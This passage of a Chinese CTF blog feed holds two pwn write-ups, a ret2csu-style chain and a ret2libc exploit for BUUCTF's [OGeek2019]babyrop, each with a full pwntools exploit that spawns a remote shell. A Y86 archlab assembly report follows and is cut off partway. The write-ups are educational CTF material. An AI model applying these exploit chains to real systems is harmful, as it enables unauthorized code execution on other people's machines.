class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span><span class="comment">#注意一下栈往低地址增长</span></span><br></pre></td></tr></table></figure><p>那么第一次溢出完美的构造了<code>/bin/sh</code>字符串并且获得了它的地址。</p><h3 id="第二次溢出"><a href="#第二次溢出" class="headerlink" title="第二次溢出"></a>第二次溢出</h3><p>第二次溢出要准备的东西就有点多了。</p><h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>我们需要的gadget有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rdx</span><br></pre></td></tr></table></figure><p>经过努力的寻找我们找到了mov rax,59用于代替pop rax，syscall本来就有，pop rdi很好找，pop rsi也有，唯独就是pop rdx找不着，但是关于rbx的gadget可以看到有一个mov rdx,r13，在libc_csu_init函数有一堆的pop寄存器的操作，我们也可以很容易找到pop r13，那么pop r13和mov rdx,r13两个一结合不就是pop rdx嘛，对吧。</p><p>但是需要注意的是，mov rdx,r13后面跟的并不是ret，所以在执行mov rdx,13这个gadget时候，要把rip及时地劫持回来。它运行到后面之后会执行call ptr[r12+rbx*8]，并且，rbx,rbp,r12~r15都是我们可以随意改的。</p><p>rbx我们置零，r12我们放在我们payload上面的其中一个地方能让它接着执行就可以了。</p><p>那么我们先写payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdx)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br></pre></td></tr></table></figure><p>就是原本传给r12的偏移我用的是+0x48的，结果给报错了，反正这个题挺神奇的，就是感觉少了八字节的数据在里面但是好像又没少，希望有师傅能为我解答一下这个困惑，但是我一般遇到这种情况就偏移多8少8都试试看，如果是32位那就上下偏移4看看。</p><p>最后给师傅们看看结果吧</p><p><img src="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28330</span>)</span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">mov_rax=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">syscall=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/ban/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\0/bin/sh\0&#x27;</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdxr13_call)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc实战</title>
      <link href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/"/>
      <url>/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><code>ret2libc</code>是一个<code>pwner</code>必备的基础知识。</p><p><code>ret2libc</code>为<code> return to libc</code>的缩写，我们需要执行<code>libc</code>函数里面的<code>system(&quot;/bin/sh&quot;)</code></p><p>下面为32位程序并且带.so文件的题目:<a href="https://buuoj.cn/challenges#[OGeek2019]babyrop">buuctfOGeek2019]babyrop</a></p><span id="more"></span><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>下载两个文件先丢进IDA里面</p><p>首先是pwn.elf</p><p><code>shift+F12</code>查看字符串，看到比较有用的就是那个<code>Correct\n</code>但是这个不是逆向题，不用从结果分析，所以这个也是没什么用的，只能等会分析没有看到这个的时候再去整这个。然后也没有看到<code>/bin/sh</code>字符串，那么我们就先放弃字符串入手了。</p><p>查看main的伪C代码，得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先给你虚晃一枪，自己获得一个我们不知道的数，如果大于0才执行<code>read(fd,&amp;buf,4u);</code>而我们都知道，<code>read()</code>函数第一个参数必须为0才能让我们输入内容，那么这一段代码直接抛弃，它注定啥也干不了。然后执行了一个函数，跟进去看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为前面传入的<code>buf</code>指针我们并不可以输入任何值，又是局部变量，所以它的值也是不确定的，然后下面比较要求<code>buf==s</code>字符串，而这个<code>s</code>是<code>main()</code>的<code>buf</code>，这个函数的<code>buf</code>是我们可以决定的。但是可惜它用的是<code>strncmp</code>指定长度比较字符串，而长度是从这个函数的buf里面算到的，那么我们就可以把字符串第一位置为<code>\x00</code>以躲过检测，然后返回了<code>buf[7]</code>，那么这里我们就知道应该输入<code>\x00</code>开始的字符串，至于后面还得看它这个返回值干了啥，返回<code>main()</code>函数发现返回值为下一个函数的参数，而下一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显我们要在这里溢出了，但是缓冲区大小有足足231，而第一个选项不足以让我们溢出，所以我们如果把参数设为<code>\xff</code>那么就能输入255长度的字符串足以让我们溢出。所以前面的一个<code>payload</code>就可以这么构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;\x00&#x27;*7+&#x27;\xff&#x27;</span><br></pre></td></tr></table></figure><p>但是找到了溢出点还不够，我们还没获取<code>system()</code>函数的地址，在<code>plt</code>表上也没有这个函数，所以我们打开<code>.so</code>文件，找到<code>system()</code>函数和<code>/bin/sh</code>字符串。注意我们反汇编的是<code>libc</code>文件，所以<code>system()</code>函数不跟平时一样在<code>plt</code>表，而是直接写在了代码段上面。</p><p><img src="https://i.loli.net/2021/05/13/5LD7viZ3xtYj4he.png" alt="buuctf _OGeek2019_babyrop_1.png"></p><p><img src="https://i.loli.net/2021/05/13/dzPSurgwslqWIcU.png" alt="buuctf _OGeek2019_babyrop_2.png"></p><p>为什么有这一步呢？因为我在学习的过程中，发现<code>libcsearcher</code>不好用了，在<code>python</code>里面只能用<code>ELF()</code>函数去加载<code>.so</code>文件，但是无法<code>search</code>到<code>/bin/sh</code>字符串所以就出现了这一步，然后我们需要执行两次这个<code>main()</code>函数，因为第一次溢出你只能泄露<code>libc</code>的地址。然后我来回答一下为什么不直接再次执行那个溢出的函数，因为我们要传参大于<code>0xe7+0x10</code>才可以溢出，而构造的<code>payload</code>链又比较麻烦，重新溢出最好挑那些没有参数或者参数对我们影响不大的去重新执行。第二次还好说，直接把<code>system()</code>地址和<code>/bin/sh</code>的<code>payload</code>传进去就ok。</p><h3 id="第一次溢出泄露libc的地址"><a href="#第一次溢出泄露libc的地址" class="headerlink" title="第一次溢出泄露libc的地址"></a>第一次溢出泄露libc的地址</h3><p>挑选能输出的函数<code>write()</code>，<code>puts()</code>都行，但是<code>write()</code>传参比较多，所以我就用<code>write()</code>，怕万一遇到没有<code>puts()</code>就不会了，所以多会点总是好的，比赛你当然怎么简单怎么来。<code>write()</code>要传的参数第一个传0，第二个传要泄露的<code>libc</code>函数的地址，第三个就是泄露的字节大小，32位程序四字节足矣，你泄露自己也行，我这里选了一个<code>read()</code>函数，道理都是一样的。那么第一次的<code>payload</code>就可以构造出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">0</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>然后就是先去算<code>libc</code>的基址，反推出<code>system()</code>的地址。</p><p><code>libc.sym[&#39;read&#39;]</code>会返回<code>read()</code>在<code>libc</code>里面的偏移，泄露出<code>read()</code>的真实地址就可以算出<code>libc</code>的真实基址了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))<span class="comment">#拿到真实地址</span></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#拿到真实基址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]libc_base_addr: &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>调试测试一下。</p><p><img src="https://i.loli.net/2021/05/13/C46D7uZNyKLh2Fr.png" alt="buuctf _OGeek2019_babyrop_3.png"></p><p>32位程序<code>libc</code>函数都是<code>0xf7</code>开头的，<code>libc</code>加载的时候会内存也对齐，所以末三位一定是0，所以我们这就得到了<code>libc</code>的真实地址。下面两步就把<code>system()</code>和<code>/bin/sh</code>算出来就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br></pre></td></tr></table></figure><p>因为好像并不能直接拿到这个偏移，但是可以在<code>gdb</code>里面调试得到<code>system()</code>相对<code>/bin/sh</code>的偏移，也可以前面<code>IDA</code>查看直接获取偏移，前面的那些地址就是我们所说的偏移，可以直接用，但是这里我们选择难一点的路线，就怕哪次给你直接断了那条简单路线，它不可能断你难的路线留一个简单的路线吧。</p><h3 id="第二次溢出直接执行system-“-bin-sh”"><a href="#第二次溢出直接执行system-“-bin-sh”" class="headerlink" title="第二次溢出直接执行system(“/bin/sh”)"></a>第二次溢出直接执行system(“/bin/sh”)</h3><p>这个payload就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br></pre></td></tr></table></figure><p>但是一定注意前面的<code>payload1</code>也要再<code>send</code>一次，不然执行不到这里的，我就这里卡了很久。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,xxx)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&#x27;[+]read_addr: &#x27;,hex(read_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]libc_base_addr: &#x27;,hex(libc_base))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]system_addr: &#x27;,hex(system_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]bin_sh: &#x27;,hex(bin_sh_addr))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)<span class="comment">#一定要再给一次</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>archlab实验报告：y86命令使用</title>
      <link href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>下载文件之后：</p><p>脑瓜子嗡嗡的，<code>writeup</code>看不懂，只能先去看看已有的实验报告，然后先做个总结——</p><p>先把里面的<code>sim.tar</code>解压了，然后进入目录之后<code>make clean</code>，<code>make</code>会在里面的所有文件该生成的文件生成了。</p><span id="more"></span><h1 id="part-A"><a href="#part-A" class="headerlink" title="part A"></a>part A</h1><p>这个部分的文件全在<code>misc</code>文件夹。</p><p>意思大概是用<code>y86</code>指令集实现<code>example.c</code>文件里面的三个函数，那也太棒了呀，我最擅长手写汇编了，汇编它虽然码起来效率低，但是能直接对底层进行操作，想想都激动<code>awa</code></p><p>要用到的指令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./yis xxx.ys  </span><br><span class="line">./yas xxx.yo</span><br></pre></td></tr></table></figure><p>第一条可以理解为汇编，第二条可以理解为链接且运行。</p><h2 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sum_list - Sum the elements of a linked list */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">sum_list</span><span class="params">(list_ptr ls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">        val += ls-&gt;val;</span><br><span class="line">        ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是一个很朴素的链表求和，用循环实现。书上有例子的，那就直接把代码写下来吧，注释上写的挺清晰了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    .pos 0#初始化</span><br><span class="line">    irmovq stack,%rsp#初始化一个栈帧</span><br><span class="line">    call main#执行主函数</span><br><span class="line">    halt#结束</span><br><span class="line">    .align 8#对齐</span><br><span class="line">ele1:#链表头</span><br><span class="line">    .quad 0x00a#链表值1</span><br><span class="line">    .quad ele2#连接下一个表</span><br><span class="line">ele2:</span><br><span class="line">    .quad 0x0b0#链表值2</span><br><span class="line">    .quad ele3#连接下一个表</span><br><span class="line">ele3:</span><br><span class="line">    .quad 0xc00#链表值3</span><br><span class="line">    .quad 0#NULL</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">    irmovq ele1,%rdi#传参</span><br><span class="line">    call sum_list#调用函数</span><br><span class="line">    ret </span><br><span class="line">sum_list:</span><br><span class="line">        irmovq $0,%r14</span><br><span class="line">        irmovq $0,%rax</span><br><span class="line">L2:</span><br><span class="line">        subq %r14,%rdi</span><br><span class="line">        je L4#到了NULL跳转L4返回</span><br><span class="line">        mrmovq (%rdi),%r13#取值</span><br><span class="line">        addq %r13,%rax#加给ax寄存器</span><br><span class="line">        mrmovq 8(%rdi),%rdi#下一个地址给%rdi</span><br><span class="line">        jmp     L2</span><br><span class="line">L4:</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">    .pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://i.loli.net/2021/05/10/xhO3Tjqgw9EGBVa.png" alt="archlab_PartA_1.png"></p><p><code>while</code>实现方式有多种，下面几种都可以，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    //循环块</span><br><span class="line">    jnz L2</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    jz L4</span><br><span class="line">    //循环块</span><br><span class="line">    jmp L2</span><br><span class="line">L4:</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>……接下来读者自己想象吧</p><h2 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h2><p>这一次也是要一个链表求和，只是函数需要递归。</p><p>那么这次我们稍微改一下，把跳转到<code>L2</code>改成重新<code>call</code>一次就好了呗，这里不过多解释了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    .pos 0#初始化</span><br><span class="line">    irmovq stack,%rsp#初始化一个栈帧</span><br><span class="line">    call main#执行主函数</span><br><span class="line">    halt#结束</span><br><span class="line">    .align 8#对齐</span><br><span class="line">ele1:#链表头</span><br><span class="line">    .quad 0x00a#链表值1</span><br><span class="line">    .quad ele2#连接下一个表</span><br><span class="line">ele2:</span><br><span class="line">    .quad 0x0b0#链表值2</span><br><span class="line">    .quad ele3#连接下一个表</span><br><span class="line">ele3:</span><br><span class="line">    .quad 0xc00#链表值3</span><br><span class="line">    .quad 0#NULL</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">    irmovq ele1,%rdi#传参</span><br><span class="line">    irmovq $0,%rax</span><br><span class="line">    call sum_list#调用函数</span><br><span class="line">    ret </span><br><span class="line">sum_list:</span><br><span class="line">        irmovq $0,%r13</span><br><span class="line">        subq %r13,%rdi</span><br><span class="line">        je L4#到了NULL跳转L4返回</span><br><span class="line">        mrmovq (%rdi),%r13#取值</span><br><span class="line">        addq %r13,%rax#加给ax寄存器</span><br><span class="line">        mrmovq 8(%rdi),%rdi#下一个地址给%rdi</span><br><span class="line">        call sum_list#递归调用</span><br><span class="line">L4:</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">    .pos 0x400</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><p>但是我这个做法在编译应该是不存在的，真正递归的话每次调用都应该用<code>rax</code>保存返回值的，但是我没有，因为我们是直接写汇编指令的，所以不必那么麻烦(其实我也不知道符不符合要求，反正能过的程序)</p><p>贴一个运行结果吧:</p><p><img src="https://i.loli.net/2021/05/11/PWqVTabiOsw6zgj.png" alt="archlab_PartA_2.png"></p><p>(PS:就感觉这个<code>lab</code>我写的挺水的，分析的东西比较少，可能还是我菜吧<code>qwq</code>)</p><h2 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 